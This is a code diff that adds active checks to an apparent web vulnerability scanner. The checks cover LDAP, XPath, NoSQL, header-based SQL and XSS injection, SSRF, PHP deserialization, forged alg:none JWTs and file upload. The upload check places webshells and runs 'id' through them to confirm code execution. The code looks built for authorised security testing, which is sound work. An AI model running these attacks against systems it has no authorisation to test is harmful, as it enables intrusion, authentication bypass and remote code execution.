+        if _stopped(sid):
+            return
+        data = {inp['name']: pl for inp in form['inputs']}
+        try:
+            if method == 'POST':
+                async with http.post(form['action'], data=data, allow_redirects=False) as resp:
+                    body = await resp.text(errors='replace')
+            else:
+                async with http.get(form['action'], params=data, allow_redirects=False) as resp:
+                    body = await resp.text(errors='replace')
+            m = _XPATH_ERROR_RE.search(body)
+            if m and not _XPATH_ERROR_RE.search(baseline):
+                _add_finding(sid, {
+                    'severity': 'high',
+                    'title':    'XPath Injection - Form',
+                    'endpoint': form['action'],
+                    'detail': (
+                        f'XPath error {m.group(0)!r} via form payload {pl!r}.'
+                    ),
+                    'evidence': {'payload': pl, 'match': m.group(0)},
+                })
+                return
+        except Exception:
+            pass
+
+
+# ── LDAP Injection ────────────────────────────────────────────────────────────
+
+async def _check_ldap_injection(sid, url, parsed, qs, param, http):
+    try:
+        async with http.get(url, allow_redirects=False) as r:
+            baseline = await r.text(errors='replace')
+            baseline_status = r.status
+    except Exception:
+        return
+    for pl in _LDAP_PAYLOADS:
+        if _stopped(sid):
+            return
+        target = _mutate_url(parsed, qs, param, pl)
+        try:
+            async with http.get(target, allow_redirects=False) as resp:
+                body = await resp.text(errors='replace')
+                status = resp.status
+            m = _LDAP_ERROR_RE.search(body)
+            if m and not _LDAP_ERROR_RE.search(baseline):
+                _add_finding(sid, {
+                    'severity': 'high',
+                    'title':    'LDAP Injection',
+                    'endpoint': url,
+                    'param':    param,
+                    'detail': (
+                        f'LDAP error {m.group(0)!r} triggered by {pl!r} on parameter {param!r}. '
+                        'Attacker may enumerate directory entries or bypass authentication.'
+                    ),
+                    'evidence': {'payload': pl, 'match': m.group(0)},
+                })
+                return
+            # Auth bypass: wildcard returns 200 where original returned 401/403
+            if pl == '*' and status == 200 and baseline_status in (401, 403):
+                _add_finding(sid, {
+                    'severity': 'critical',
+                    'title':    'LDAP Injection - Authentication Bypass',
+                    'endpoint': url,
+                    'param':    param,
+                    'detail': (
+                        f'Wildcard LDAP payload {pl!r} changed HTTP status from '
+                        f'{baseline_status} to 200 — possible auth bypass.'
+                    ),
+                    'evidence': {'payload': pl, 'baseline_status': baseline_status, 'status': status},
+                })
+                return
+        except Exception:
+            pass
+
+
+async def _check_form_ldap(sid, form, http):
+    method = form.get('method', 'GET').upper()
+    try:
+        async with http.get(form['action'], allow_redirects=False) as r:
+            baseline = await r.text(errors='replace')
+    except Exception:
+        return
+    for pl in _LDAP_PAYLOADS[:10]:
+        if _stopped(sid):
+            return
+        data = {inp['name']: pl for inp in form['inputs']}
+        try:
+            if method == 'POST':
+                async with http.post(form['action'], data=data, allow_redirects=False) as resp:
+                    body = await resp.text(errors='replace')
+            else:
+                async with http.get(form['action'], params=data, allow_redirects=False) as resp:
+                    body = await resp.text(errors='replace')
+            m = _LDAP_ERROR_RE.search(body)
+            if m and not _LDAP_ERROR_RE.search(baseline):
+                _add_finding(sid, {
+                    'severity': 'high',
+                    'title':    'LDAP Injection - Form',
+                    'endpoint': form['action'],
+                    'detail': f'LDAP error {m.group(0)!r} via form payload {pl!r}.',
+                    'evidence': {'payload': pl, 'match': m.group(0)},
+                })
+                return
+        except Exception:
+            pass
+
+
+# ── HTTP Parameter Pollution ──────────────────────────────────────────────────
+
+async def _check_hpp(sid, url, parsed, qs, param, http):
+    """Duplicate a parameter with an XSS canary — if canary reflects, WAF/logic is bypassed."""
+    if _stopped(sid):
+        return
+    canary = f'{_HPP_XSS_CANARY}{uuid.uuid4().hex[:6]}'
+    original_val = (qs.get(param) or [''])[0]
+    # Build URL with duplicate param: original value first, then canary
+    base = _mutate_url(parsed, qs, param, original_val)
+    separator = '&' if '?' in base else '?'
+    target = f'{base}{separator}{param}={canary}'
+    try:
+        async with http.get(target, allow_redirects=False) as resp:
+            body = await resp.text(errors='replace')
+        if canary in body:
+            _add_finding(sid, {
+                'severity': 'medium',
+                'title':    'HTTP Parameter Pollution',
+                'endpoint': url,
+                'param':    param,
+                'detail': (
+                    f'Duplicate parameter {param!r} with canary {canary!r} was reflected. '
+                    'Application may process the second value, allowing WAF bypass or logic abuse.'
+                ),
+                'evidence': {'url': target, 'canary': canary},
+            })
+    except Exception:
+        pass
+
+
+# ── SQLi in HTTP Headers ──────────────────────────────────────────────────────
+
+async def _check_sqli_headers(sid, url, http):
+    try:
+        async with http.get(url, allow_redirects=False) as r:
+            baseline = await r.text(errors='replace')
+            baseline_status = r.status
+    except Exception:
+        return
+    for header in _SQLI_INJECT_HEADERS:
+        for pl in _HEADER_SQLI_PAYLOADS:
+            if _stopped(sid):
+                return
+            try:
+                t0 = time.monotonic()
+                async with http.get(url, headers={header: pl}, allow_redirects=False) as resp:
+                    elapsed = time.monotonic() - t0
+                    body = await resp.text(errors='replace')
+                m = _SQLI_ERRORS.search(body)
+                if m and not _SQLI_ERRORS.search(baseline):
+                    _add_finding(sid, {
+                        'severity': 'high',
+                        'title':    f'SQL Injection via HTTP Header ({header})',
+                        'endpoint': url,
+                        'detail': (
+                            f'DB error {m.group(0)!r} triggered by SQLi payload in {header!r} header. '
+                            'Application logs/processes this header without sanitization.'
+                        ),
+                        'evidence': {'header': header, 'payload': pl, 'match': m.group(0)},
+                    })
+                    return
+                if elapsed >= 4.5 and ('SLEEP' in pl.upper() or 'WAITFOR' in pl.upper() or 'pg_sleep' in pl):
+                    _add_finding(sid, {
+                        'severity': 'high',
+                        'title':    f'SQL Injection (Time-Based) via HTTP Header ({header})',
+                        'endpoint': url,
+                        'detail': (
+                            f'Response delayed {elapsed:.1f}s with time-based SQLi payload in {header!r} header.'
+                        ),
+                        'evidence': {'header': header, 'payload': pl, 'elapsed': elapsed},
+                    })
+                    return
+            except Exception:
+                pass
+
+
+# ── XSS in HTTP Headers ───────────────────────────────────────────────────────
+
+async def _check_xss_headers(sid, url, http):
+    try:
+        async with http.get(url, allow_redirects=False) as r:
+            baseline = await r.text(errors='replace')
+    except Exception:
+        return
+    for header in _XSS_INJECT_HEADERS:
+        for pl in _HEADER_XSS_PAYLOADS:
+            if _stopped(sid):
+                return
+            try:
+                async with http.get(url, headers={header: pl}, allow_redirects=False) as resp:
+                    body = await resp.text(errors='replace')
+                if 'ds1hdr' in body and 'ds1hdr' not in baseline:
+                    _add_finding(sid, {
+                        'severity': 'high',
+                        'title':    f'XSS via HTTP Header ({header})',
+                        'endpoint': url,
+                        'detail': (
+                            f'XSS payload {pl!r} in {header!r} header was reflected in the response. '
+                            'If rendered without encoding, this is exploitable.'
+                        ),
+                        'evidence': {'header': header, 'payload': pl},
+                    })
+                    return
+            except Exception:
+                pass
+
+
+# ── SSRF via Request Headers ──────────────────────────────────────────────────
+
+async def _check_ssrf_headers(sid, url, http):
+    sigs = ['ami-id', 'instance-id', 'meta-data', 'AccessKeyId', 'subscriptionId']
+    try:
+        async with http.get(url, allow_redirects=False) as r:
+            baseline = await r.text(errors='replace')
+    except Exception:
+        return
+    for header, value in _SSRF_HEADERS_PROBES:
+        if _stopped(sid):
+            return
+        try:
+            async with http.get(url, headers={header: value}, allow_redirects=False) as resp:
+                body = await resp.text(errors='replace')
+            hit = any(s in body and s not in baseline for s in sigs)
+            if hit:
+                matched = next(s for s in sigs if s in body and s not in baseline)
+                _add_finding(sid, {
+                    'severity': 'critical',
+                    'title':    f'SSRF via HTTP Header ({header})',
+                    'endpoint': url,
+                    'detail': (
+                        f'Cloud metadata signature {matched!r} found in response when '
+                        f'{header}: {value} was injected. Application may be forwarding '
+                        'the spoofed IP to an internal metadata service.'
+                    ),
+                    'evidence': {'header': header, 'value': value, 'match': matched},
+                })
+                return
+        except Exception:
+            pass
+
+
+# ── NoSQL Injection in Forms ──────────────────────────────────────────────────
+
+async def _check_form_nosqli(sid, form, http):
+    method = form.get('method', 'GET').upper()
+    _nosql_payloads = [
+        {'$gt': ''},
+        {'$ne': 'invalid'},
+        {'$regex': '.*'},
+        {'$where': '1==1'},
+        {'$exists': True},
+    ]
+    _nosql_error_re = re.compile(
+        r'MongoError|CastError|BSONTypeError|mongo|mongodb|'
+        r'\$gt|\$ne|\$regex|operator.*not.*allowed|'
+        r'SyntaxError.*JSON|Unexpected token',
+        re.I,
+    )
+    import json as _json
+    try:
+        async with http.get(form['action'], allow_redirects=False) as r:
+            baseline_body = await r.text(errors='replace')
+            baseline_status = r.status
+    except Exception:
+        return
+    for pl_dict in _nosql_payloads:
+        if _stopped(sid):
+            return
+        # Send as JSON
+        try:
+            payload_data = {inp['name']: pl_dict for inp in form['inputs']}
+            async with http.post(
+                form['action'],
+                json=payload_data,
+                headers={'Content-Type': 'application/json'},
+                allow_redirects=False,
+            ) as resp:
+                body = await resp.text(errors='replace')
+                status = resp.status
+            m = _nosql_error_re.search(body)
+            if (m and not _nosql_error_re.search(baseline_body)) or (
+                status == 200 and baseline_status in (401, 403)
+            ):
+                _add_finding(sid, {
+                    'severity': 'high',
+                    'title':    'NoSQL Injection - Form (JSON body)',
+                    'endpoint': form['action'],
+                    'detail': (
+                        f'NoSQL operator {list(pl_dict.keys())[0]!r} in JSON body '
+                        f'{"triggered error" if m else f"changed status {baseline_status}→{status}"}. '
+                        'MongoDB/NoSQL query may be injectable via form.'
+                    ),
+                    'evidence': {'payload': pl_dict, 'match': m.group(0) if m else None},
+                })
+                return
+        except Exception:
+            pass
+
+
+# ── PHP Object Injection ──────────────────────────────────────────────────────
+
+async def _check_php_deser(sid, url, http):
+    try:
+        async with http.get(url, allow_redirects=False) as r:
+            baseline = await r.text(errors='replace')
+            baseline_status = r.status
+    except Exception:
+        return
+    # Try payloads in query params, POST body, and Cookie header
+    for pl in _PHP_DESER_PAYLOADS[:3]:
+        if _stopped(sid):
+            return
+        try:
+            # GET param injection
+            sep = '&' if '?' in url else '?'
+            async with http.get(f'{url}{sep}data={pl}', allow_redirects=False) as resp:
+                body = await resp.text(errors='replace')
+            m = _PHP_DESER_ERROR_RE.search(body)
+            if m and not _PHP_DESER_ERROR_RE.search(baseline):
+                _add_finding(sid, {
+                    'severity': 'critical',
+                    'title':    'PHP Object Injection (Insecure Deserialization)',
+                    'endpoint': url,
+                    'detail': (
+                        f'PHP deserialization error {m.group(0)!r} triggered by serialized object payload. '
+                        'If gadget chains exist, this leads to RCE.'
+                    ),
+                    'evidence': {'payload': pl[:120], 'match': m.group(0)},
+                })
+                return
+        except Exception:
+            pass
+        try:
+            # Cookie injection
+            async with http.get(url, headers={'Cookie': f'data={pl}'}, allow_redirects=False) as resp:
+                body = await resp.text(errors='replace')
+            m = _PHP_DESER_ERROR_RE.search(body)
+            if m and not _PHP_DESER_ERROR_RE.search(baseline):
+                _add_finding(sid, {
+                    'severity': 'critical',
+                    'title':    'PHP Object Injection via Cookie (Insecure Deserialization)',
+                    'endpoint': url,
+                    'detail': (
+                        f'PHP deserialization error {m.group(0)!r} from serialized object in Cookie. '
+                        'Attacker-controlled cookie may allow gadget chain execution.'
+                    ),
+                    'evidence': {'payload': pl[:120], 'match': m.group(0)},
+                })
+                return
+        except Exception:
+            pass
+
+
+# ── JWT Attacks ───────────────────────────────────────────────────────────────
+
+async def _check_jwt(sid, url, http):
+    """Test alg:none bypass and detect JWT-protected endpoints."""
+    import base64 as _b64
+    try:
+        async with http.get(url, allow_redirects=False) as r:
+            baseline_status = r.status
+            baseline_body = await r.text(errors='replace')
+    except Exception:
+        return
+
+    # Only interesting if endpoint returns 401/403 (JWT-protected)
+    if baseline_status not in (200, 401, 403):
+        return
+
+    # alg:none forged admin token
+    for hdr_name in _JWT_HEADER_NAMES:
+        if _stopped(sid):
+            return
+        try:
+            async with http.get(
+                url,
+                headers={hdr_name: f'Bearer {_JWT_NONE_TOKEN}'},
+                allow_redirects=False,
+            ) as resp:
+                status = resp.status
+                body = await resp.text(errors='replace')
+            if baseline_status in (401, 403) and status == 200:
+                _add_finding(sid, {
+                    'severity': 'critical',
+                    'title':    f'JWT Authentication Bypass (alg:none) via {hdr_name}',
+                    'endpoint': url,
+                    'detail': (
+                        f'Forged JWT with alg:none and sub=admin changed response from '
+                        f'HTTP {baseline_status} to 200. Server accepts unsigned tokens.'
+                    ),
+                    'evidence': {'header': hdr_name, 'token': _JWT_NONE_TOKEN},
+                })
+                return
+        except Exception:
+            pass
+
+    # Detect JWT in existing response headers (for information)
+    try:
+        async with http.get(url, allow_redirects=False) as resp:
+            for hdr_val in resp.headers.values():
+                if hdr_val.startswith('eyJ'):
+                    parts = hdr_val.split('.')
+                    if len(parts) == 3:
+                        try:
+                            header_data = _b64.b64decode(parts[0] + '==').decode('utf-8', errors='replace')
+                            if '"alg"' in header_data and '"none"' in header_data.lower():
+                                _add_finding(sid, {
+                                    'severity': 'high',
+                                    'title':    'JWT with alg:none in Response Header',
+                                    'endpoint': url,
+                                    'detail':   'Server issued a JWT token with alg:none — no signature verification.',
+                                    'evidence': {'header_data': header_data},
+                                })
+                        except Exception:
+                            pass
+    except Exception:
+        pass
+
+
+# ── Second-Order Injection Detection ─────────────────────────────────────────
+
+async def _check_second_order(sid, url, parsed, qs, param, http):
+    """Store a canary, then fetch a read-back endpoint to detect stored/second-order injection."""
+    canary = f"ds1so'{uuid.uuid4().hex[:6]}--"
+    target = _mutate_url(parsed, qs, param, canary)
+    try:
+        # Store the canary
+        async with http.get(target, allow_redirects=True) as resp:
+            await resp.read()
+        await asyncio.sleep(0.3)
+        # Re-fetch the same endpoint and check if canary echoes
+        async with http.get(url, allow_redirects=True) as resp:
+            body = await resp.text(errors='replace')
+        m = _SQLI_ERRORS.search(body)
+        if m:
+            _add_finding(sid, {
+                'severity': 'high',
+                'title':    'Second-Order SQL Injection',
+                'endpoint': url,
+                'param':    param,
+                'detail': (
+                    f'SQL error {m.group(0)!r} appeared in response after storing canary {canary!r}. '
+                    'Application stores input and uses it unsanitized in a later query.'
+                ),
+                'evidence': {'stored_payload': canary, 'triggered_at': url, 'match': m.group(0)},
+            })
+    except Exception:
+        pass
+
+
+# ── File Upload Vulnerability ─────────────────────────────────────────────────
+
+async def _check_file_upload(sid, url, http, forms=None):
+    """
+    Test every file upload form on the endpoint.
+    Tries: dangerous extensions, content-type bypass, double extension,
+    null byte, polyglot (GIF+PHP), .htaccess injection, SVG XSS.
+    After each upload confirms execution by fetching the uploaded URL.
+    """
+    import io as _io
+    from urllib.parse import urljoin as _urljoin
+
+    if _stopped(sid):
+        return
+
+    upload_forms = []
+
+    # Collect forms with file inputs passed from endpoint data
+    if forms:
+        for form in forms:
+            file_inputs = [i for i in form.get('inputs', []) if i.get('type', '').lower() == 'file']
+            if file_inputs:
+                upload_forms.append((form['action'], form.get('method', 'POST').upper(), file_inputs))
+
+    # If no explicit form data, probe common upload endpoints blindly
+    if not upload_forms:
+        upload_forms.append((url, 'POST', []))
+
+    base_origin = '/'.join(url.split('/')[:3])  # https://example.com
+
+    for action, method, file_inputs in upload_forms:
+        if _stopped(sid):
+            return
+
+        # Determine field names to try
+        if file_inputs:
+            field_names = [i['name'] for i in file_inputs] + _UPLOAD_FIELD_NAMES
+        else:
+            field_names = _UPLOAD_FIELD_NAMES
+
+        for ext, content_type, content in _UPLOAD_EXTENSIONS:
+            if _stopped(sid):
+                return
+
+            canary_name = f'ds1upload_{uuid.uuid4().hex[:8]}{ext}'
+
+            for field in field_names[:6]:   # cap field attempts per extension
+                if _stopped(sid):
+                    return
+                try:
+                    form_data = aiohttp.FormData()
+                    form_data.add_field(
+                        field,
+                        _io.BytesIO(content),
+                        filename=canary_name,
+                        content_type=content_type,
+                    )
+                    # Add any other required form fields as empty strings
+                    for inp in file_inputs:
+                        if inp.get('type', '').lower() != 'file' and inp.get('name'):
+                            form_data.add_field(inp['name'], inp.get('value', ''))
+
+                    async with http.post(
+                        action,
+                        data=form_data,
+                        allow_redirects=True,
+                        timeout=aiohttp.ClientTimeout(total=15),
+                    ) as resp:
+                        status = resp.status
+                        body = await resp.text(errors='replace')
+
+                    if status not in (200, 201, 202):
+                        continue
+
+                    # Try to find where the file was stored
+                    uploaded_url = None
+                    m_path = _UPLOAD_PATH_RE.search(body) or _UPLOAD_URL_RE.search(body)
+                    if m_path:
+                        path = m_path.group(1)
+                        uploaded_url = _urljoin(base_origin, path) if path.startswith('/') else path
+
+                    # SVG XSS: any 200 accept is a finding
+                    if ext == '.svg' and status in (200, 201, 202):
+                        _add_finding(sid, {
+                            'severity': 'high',
+                            'title':    'File Upload - SVG XSS',
+                            'endpoint': action,
+                            'detail': (
+                                f'Server accepted SVG file {canary_name!r} via field {field!r}. '
+                                'SVG files can contain JavaScript and execute in the browser '
+                                'when loaded directly, enabling stored XSS.'
+                            ),
+                            'evidence': {
+                                'field':        field,
+                                'filename':     canary_name,
+                                'content_type': content_type,
+                                'uploaded_url': uploaded_url or '',
+                            },
+                        })
+                        break
+
+                    # .htaccess upload
+                    if ext == '.htaccess' and status in (200, 201):
+                        _add_finding(sid, {
+                            'severity': 'critical',
+                            'title':    'File Upload - .htaccess Override',
+                            'endpoint': action,
+                            'detail': (
+                                f'Server accepted .htaccess file via field {field!r}. '
+                                'An attacker can override Apache directives in the upload directory, '
+                                'enabling PHP execution of uploaded image files.'
+                            ),
+                            'evidence': {
+                                'field':        field,
+                                'filename':     canary_name,
+                                'content_type': content_type,
+                            },
+                        })
+                        break
+
+                    # Webshell: try execution confirmation
+                    if uploaded_url:
+                        exec_confirmed = False
+                        try:
+                            async with http.get(
+                                f'{uploaded_url}?cmd=id',
+                                allow_redirects=True,
+                                timeout=aiohttp.ClientTimeout(total=8),
+                            ) as exec_resp:
+                                exec_body = await exec_resp.text(errors='replace')
+                            if _SHELL_EXEC_RE.search(exec_body):
+                                exec_confirmed = True
+                                _add_finding(sid, {
+                                    'severity': 'critical',
+                                    'title':    f'Remote Code Execution via File Upload ({ext})',
+                                    'endpoint': action,
+                                    'detail': (
+                                        f'Uploaded webshell {canary_name!r} was accessible at '
+                                        f'{uploaded_url} and executed OS commands. '
+                                        f'Content-Type bypass: {content_type!r}.'
+                                    ),
+                                    'evidence': {
+                                        'field':        field,
+                                        'filename':     canary_name,
+                                        'content_type': content_type,
+                                        'uploaded_url': uploaded_url,
+                                        'exec_output':  exec_body[:200],
+                                    },
+                                })
+                                return
+                        except Exception:
+                            pass
+
+                        if not exec_confirmed:
+                            # File is accessible but execution not confirmed
+                            try:
+                                async with http.get(
+                                    uploaded_url,
+                                    allow_redirects=True,
+                                    timeout=aiohttp.ClientTimeout(total=8),
+                                ) as file_resp:
+                                    file_body = await file_resp.text(errors='replace')
+                                if file_resp.status == 200:
+                                    # Source echoed back = not executed (good) vs parsed = bad
+                                    severity = 'critical' if '<?php' not in file_body else 'high'
+                                    _add_finding(sid, {
+                                        'severity': severity,
+                                        'title':    f'Unrestricted File Upload ({ext})',
+                                        'endpoint': action,
+                                        'detail': (
+                                            f'Server accepted {canary_name!r} with Content-Type '
+                                            f'{content_type!r} and file is publicly accessible at '
+                                            f'{uploaded_url}. '
+                                            + ('PHP source not executed — may need .htaccess trick.'
+                                               if '<?php' in file_body else
+                                               'File appears to be executed by the server.')
+                                        ),
+                                        'evidence': {
+                                            'field':        field,
+                                            'filename':     canary_name,
+                                            'content_type': content_type,
+                                            'uploaded_url': uploaded_url,
+                                        },
+                                    })
+                                    return
+                            except Exception:
+                                pass
+                    else:
+                        # No URL disclosed — still report that dangerous file was accepted
+                        if ext in ('.php', '.php5', '.phtml', '.phar', '.asp', '.aspx', '.jsp'):
+                            _add_finding(sid, {
+                                'severity': 'high',
+                                'title':    f'Unrestricted File Upload - Dangerous Extension ({ext})',
+                                'endpoint': action,
+                                'detail': (
+                                    f'Server accepted file {canary_name!r} with extension {ext!r} '
+                                    f'and Content-Type {content_type!r} via field {field!r}. '
+                                    'No upload path disclosed in response — manual verification needed.'
+                                ),
+                                'evidence': {
+                                    'field':        field,
+                                    'filename':     canary_name,
+                                    'content_type': content_type,
+                                    'response_status': status,
+                                },
+                            })
+                            return
+
+                except Exception:
+                    continue
